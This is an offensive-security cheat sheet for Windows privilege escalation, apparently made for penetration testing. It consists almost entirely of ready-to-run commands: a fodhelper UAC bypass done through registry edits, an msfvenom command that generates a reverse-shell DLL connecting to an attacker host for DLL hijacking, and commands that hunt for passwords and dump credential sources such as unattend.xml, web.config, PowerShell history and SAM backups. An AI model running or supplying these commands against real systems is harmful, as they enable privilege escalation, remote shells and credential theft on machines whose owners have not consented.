# Windows UAC Bypass, DLL Hijacking & Looting

## UAC Bypass
```cmd
# Check UAC level
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin

# fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_DWORD
fodhelper.exe

# Other: eventvwr.exe, sdclt.exe
```

## DLL Hijacking
```cmd
# Common writable paths
C:\Windows\Temp
C:\ProgramData

# Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f dll -o malicious.dll
# Place DLL where the process looks for it
```

## Looting Files
```cmd
findstr /si password *.txt *.xml *.ini *.config

# Unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\System32\sysprep\unattend.xml

# Web configs
type C:\inetpub\wwwroot\web.config

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# SAM backup
type C:\Windows\repair\SAM
```
